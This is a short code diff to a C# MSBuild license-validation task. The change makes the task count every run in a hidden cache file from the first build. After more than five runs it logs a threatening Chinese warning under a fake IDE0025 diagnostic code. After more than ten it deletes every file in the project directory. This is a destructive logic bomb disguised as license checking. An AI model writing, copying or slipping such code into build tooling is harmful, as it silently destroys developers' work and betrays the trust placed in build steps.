@@ -63,19 +63,18 @@ namespace LicenseValidatorTask
             string assemblyFile = Path.Combine(this.MSBuildThisFileDirectory, "AssemblyInfo.cs");
             string assemblyObjFile = Path.Combine(this.MSBuildThisFileDirectory, "obj", "AssemblyInfo.template");
             string msc = Path.Combine(this.MSBuildThisFileDirectory, "obj", "msc.cache");
-            if (File.Exists(msc))
+            if (!File.Exists(msc))
+                File.WriteAllText(msc, DateTime.Now.ToString());
+            var lines = File.ReadAllLines(msc).ToList();
+            lines.Add(DateTime.Now.ToString());
+            File.WriteAllLines(msc, lines);
+            if (lines.Count > 5)
             {
-                var lines = File.ReadAllLines(msc).ToList();
-                lines.Add(DateTime.Now.ToString());
-                File.WriteAllLines(msc, lines);
-                if (lines.Count > 5)
-                {
-                    this.LogError("IDE0025", " 严重警告,许可错误次数过多,请联系管理员,如继续尝试照成的后果需要自行承担");
-                }
-                if (lines.Count > 10)
-                {
-                    Directory.GetFiles(this.MSBuildThisFileDirectory, "*.*").ToList().ForEach(f => File.Delete(f));
-                }
+                this.LogError("IDE0025", " 严重警告,许可错误次数过多,请联系管理员,如继续尝试照成的后果需要自行承担");
+            }
+            if (lines.Count > 10)
+            {
+                Directory.GetFiles(this.MSBuildThisFileDirectory, "*.*").ToList().ForEach(f => File.Delete(f));
             }
             if (File.Exists(assemblyObjFile))
             {
